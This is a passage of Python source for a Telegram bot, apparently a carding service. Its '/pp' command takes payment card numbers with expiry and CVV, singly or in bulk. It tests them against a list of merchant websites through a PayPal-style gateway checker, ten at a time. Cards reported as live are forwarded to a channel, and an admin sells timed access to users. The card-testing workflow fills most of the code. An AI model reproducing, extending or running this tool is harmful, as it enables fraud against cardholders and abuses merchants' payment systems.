        await update.message.reply_text(
            "❌ You don't have access to use this bot.\n"
            f"Your User ID: `{user_id}`\n\n"
            "Please contact @TUMAOB for approval.",
            parse_mode='Markdown'
        )
        return

    # Check if card details are provided
    if not context.args:
        await update.message.reply_text(
            "❌ Please provide card details.\n\n"
            "Single Card Format: /pp number|mm|yy|cvv\n"
            "Mass Check Format:\n/pp 5401683112957490|10|2029|741\n4386680119536105|01|2029|147\n4000223361770415|04|2029|639"
        )
        return

    # Parse cards from message (support multiline input)
    message_text = update.message.text
    # Remove the /pp command
    cards_text = message_text.replace('/pp', '', 1).strip()

    # Split by newlines to get individual cards
    card_lines = [line.strip() for line in cards_text.split('\n') if line.strip()]

    if not card_lines:
        await update.message.reply_text(
            "❌ No valid cards found.\n\n"
            "Format:\n"
            "Single: /pp number|mm|yy|cvv\n"
            "Mass: /pp 5401683112957490|10|2029|741\n4386680119536105|01|2029|147"
        )
        return

    # Normalize all cards
    normalized_cards = []
    for card_line in card_lines:
        # Import ppcp module dynamically
        from ppcp import ppcpgatewaycvv
        normalized = ppcpgatewaycvv.normalize_card_format(card_line)
        if normalized:
            normalized_cards.append(normalized)
        else:
            await update.message.reply_text(
                f"❌ Invalid card format: {card_line}\n\n"
                "Supported formats:\n"
                "- number|mm|yy|cvv\n"
                "- number mmyy cvv"
            )
            return

    total_cards = len(normalized_cards)

    # Handle single card vs mass checking
    if total_cards == 1:
        # Single card - apply rate limiting for non-admin users
        if not is_admin:
            with user_rate_limit_lock:
                current_time = time.time()
                last_check_time = user_rate_limit.get(user_id, 0)
                time_since_last_check = current_time - last_check_time

                if time_since_last_check < RATE_LIMIT_SECONDS:
                    wait_time = RATE_LIMIT_SECONDS - time_since_last_check
                    await update.message.reply_text(
                        f"⏳ Please wait {wait_time:.1f} seconds before checking another card.\n"
                        "This prevents overloading the system."
                    )
                    return

                # Update last check time
                user_rate_limit[user_id] = current_time

        # Send "Checking Please Wait" message
        checking_msg = await update.message.reply_text("⏳ Checking Please Wait...")

        try:
            # Check the single card using async ppcp gateway
            # Load sites from sites.txt file
            sites = []
            if os.path.exists('ppcp/sites.txt'):
                with open('ppcp/sites.txt', 'r') as f:
                    sites = [line.strip() for line in f if line.strip()]
            else:
                # Load from the project root if ppcp folder is not present in the path
                if os.path.exists('sites.txt'):
                    with open('sites.txt', 'r') as f:
                        sites = [line.strip() for line in f if line.strip()]

            if not sites:
                result = "❌ No sites found!"
            else:
                from ppcp.async_ppcpgatewaycvv import check_single_card
                result = await check_single_card(normalized_cards[0], sites)

            # Edit the message with the result
            await checking_msg.edit_text(result)

            # Forward to channel if approved
            await forward_to_channel(context, normalized_cards[0], result)

        except Exception as e:
            error_message = f"❌ Error checking card: {str(e)}"
            await checking_msg.edit_text(error_message)
            print(f"Error in /pp command: {str(e)}")

    else:
        # Mass checking - apply rate limiting between cards for non-admin users
        # Send initial status message
        status_msg = await update.message.reply_text(
            f"⏳ Checking {total_cards} card(s)...\n"
            f"Progress: 0/{total_cards}"
        )

        # Load sites from sites.txt file
        sites = []
        if os.path.exists('ppcp/sites.txt'):
            with open('ppcp/sites.txt', 'r') as f:
                sites = [line.strip() for line in f if line.strip()]
        else:
            # Load from the project root if ppcp folder is not present in the path
            if os.path.exists('sites.txt'):
                with open('sites.txt', 'r') as f:
                    sites = [line.strip() for line in f if line.strip()]

        if not sites:
            await status_msg.edit_text("❌ No sites found!")
            return

        # Check all cards with 10 concurrent bots
        results = await check_ppcp_mass_cards(normalized_cards, sites, max_concurrent=10)

        # Process results
        approved_count = 0
        declined_count = 0

        for idx, result in enumerate(results):
            # Rate limiting for non-admin users (between cards in mass check)
            if not is_admin and idx > 0:
                with user_rate_limit_lock:
                    current_time = time.time()
                    last_check_time = user_rate_limit.get(user_id, 0)
                    time_since_last_check = current_time - last_check_time

                    if time_since_last_check < RATE_LIMIT_SECONDS:
                        wait_time = RATE_LIMIT_SECONDS - time_since_last_check
                        await asyncio.sleep(wait_time)

                    # Update last check time
                    user_rate_limit[user_id] = time.time()

            # Count approved/declined
            if ("CCN" in result and "✅" in result) or ("CVV" in result and "✅" in result):
                approved_count += 1
                # Forward to channel if approved
                await forward_to_channel(context, normalized_cards[idx], result)
            else:
                declined_count += 1

            # Send result immediately after checking
            card_result = f"Card {idx + 1}/{total_cards}:\n{result}"
            await update.message.reply_text(card_result)

            # Update progress every card
            try:
                await status_msg.edit_text(
                    f"⏳ Checking {total_cards} card(s)...\n"
                    f"Progress: {idx + 1}/{total_cards}\n"
                    f"✅ Approved: {approved_count} | ❌ Declined: {declined_count}"
                )
            except:
                pass  # Ignore edit errors (e.g., message not modified)

        # Send final summary
        summary = f"📊 Mass Check Complete\n\n"
        summary += f"Total Cards: {total_cards}\n"
        summary += f"✅ Approved: {approved_count}\n"
        summary += f"❌ Declined: {declined_count}"

        await update.message.reply_text(summary)

        # Delete the progress message
        try:
            await status_msg.delete()
        except:
            pass

async def approve_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /approve command (admin only)"""
    user_id = update.effective_user.id
    
    print(f"DEBUG: /approve command called by user {user_id}")
    
    # Check if user is admin
    if user_id != ADMIN_ID:
        await update.message.reply_text("❌ This command is only available to admins.")
        return
    
    # Check if user ID is provided
    if not context.args:
        await update.message.reply_text(
            "❌ Please provide a user ID.\n\n"
            "Format: /approve <user_id>\n"
            "Example: /approve 7405189284"
        )
        return
    
    try:
        target_user_id = int(context.args[0])
        print(f"DEBUG: Target user ID to approve: {target_user_id}")
    except ValueError:
        await update.message.reply_text("❌ Invalid user ID. Please provide a numeric user ID.")
        return
    
    # Store pending approval (thread-safe)
    with pending_approvals_lock:
        pending_approvals[user_id] = target_user_id
        print(f"DEBUG: Stored pending approval - Admin {user_id} -> Target {target_user_id}")
        print(f"DEBUG: Current pending_approvals: {pending_approvals}")
    
    # Create inline keyboard for duration selection
    keyboard = [
        [
            InlineKeyboardButton("1 Day", callback_data='duration_1day'),
            InlineKeyboardButton("1 Week", callback_data='duration_1week'),
        ],
        [
            InlineKeyboardButton("1 Month", callback_data='duration_1month'),
            InlineKeyboardButton("Lifetime", callback_data='duration_lifetime'),
        ]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    print(f"DEBUG: Sending keyboard with {len(keyboard)} rows")
    
    await update.message.reply_text(
        f"👤 Approving user: `{target_user_id}`\n\n"
        "⏰ How long should this user have access?",
        reply_markup=reply_markup,
        parse_mode='Markdown'
    )
    
    print(f"DEBUG: Keyboard sent successfully")

async def duration_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle duration selection callback"""
    query = update.callback_query
    
    try:
        # Answer the callback query immediately to remove loading state
        await query.answer()
        
        user_id = query.from_user.id
        
        print(f"DEBUG: Callback received from user {user_id}, data: {query.data}")
        
        # Check if user is admin
        if user_id != ADMIN_ID:
            await query.edit_message_text("❌ This action is only available to admins.")
            return
        
        # Check if there's a pending approval (thread-safe)
        with pending_approvals_lock:
            print(f"DEBUG: Current pending_approvals: {pending_approvals}")
            if user_id not in pending_approvals:
                await query.edit_message_text("❌ No pending approval found. Please use /approve <user_id> again.")
                return
            
            target_user_id = pending_approvals[user_id]
            print(f"DEBUG: Target user ID: {target_user_id}")
        
        duration_type = query.data.replace('duration_', '')
        print(f"DEBUG: Duration type: {duration_type}")
        
        # Approve the user
        success = approve_user(target_user_id, duration_type)
        print(f"DEBUG: Approval success: {success}")
        
        if success:
            duration_text = {
                '1day': '1 Day',
                '1week': '1 Week',
                '1month': '1 Month',
                'lifetime': 'Lifetime'
            }.get(duration_type, duration_type)
            
            await query.edit_message_text(
                f"✅ User `{target_user_id}` has been approved!\n\n"
                f"⏰ Access Duration: {duration_text}",
                parse_mode='Markdown'
            )
            
            # Remove from pending approvals (thread-safe)
            with pending_approvals_lock:
                if user_id in pending_approvals:
                    del pending_approvals[user_id]
                    print(f"DEBUG: Removed pending approval for admin {user_id}")
        else:
            await query.edit_message_text("❌ Failed to approve user. Please try again.")
    
    except Exception as e:
        print(f"ERROR in duration_callback: {str(e)}")
        import traceback
        traceback.print_exc()
        try:
            await query.edit_message_text(f"❌ Error processing approval: {str(e)}")
        except:
            pass

async def unknown_callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle unknown callback queries for debugging"""
    query = update.callback_query
    if query:
        print(f"DEBUG: Unknown callback received: {query.data} from user {query.from_user.id}")
        await query.answer("⚠️ Unknown action. Please try again.")

async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle errors"""
    print(f"Update {update} caused error {context.error}")
    import traceback
    traceback.print_exc()

def main():
    """Main function to run the bot"""
    print("🚀 Starting Telegram Bot...")
    
    # Get bot token from environment variable or file
    bot_token = os.getenv('TELEGRAM_BOT_TOKEN')
    
    if not bot_token:
        # Try to read from bot_token.txt file
        try:
            with open('bot_token.txt', 'r') as f:
                bot_token = f.read().strip()
        except FileNotFoundError:
            print("❌ Bot token not found!")
            print("Please set TELEGRAM_BOT_TOKEN environment variable or create bot_token.txt file")
            return
    
    # Create application
    application = Application.builder().token(bot_token).build()
    
    # Add handlers
    application.add_handler(CommandHandler("start", start_command))
    application.add_handler(CommandHandler("b3", b3_command))
    application.add_handler(CommandHandler("b3s", b3s_command))
    application.add_handler(CommandHandler("pp", pp_command))
    application.add_handler(CommandHandler("approve", approve_command))
    
    # Add callback query handler for duration selection (must be before generic handlers)
    application.add_handler(CallbackQueryHandler(duration_callback, pattern=r'^duration_'))
    
    # Add catch-all callback handler for debugging (must be last)
    application.add_handler(CallbackQueryHandler(unknown_callback_handler))
    
    # Add error handler
    application.add_error_handler(error_handler)
    
    print("✅ Handlers registered successfully")
    
    # Start the bot
    print("✅ Bot is running...")
    application.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == '__main__':
    main()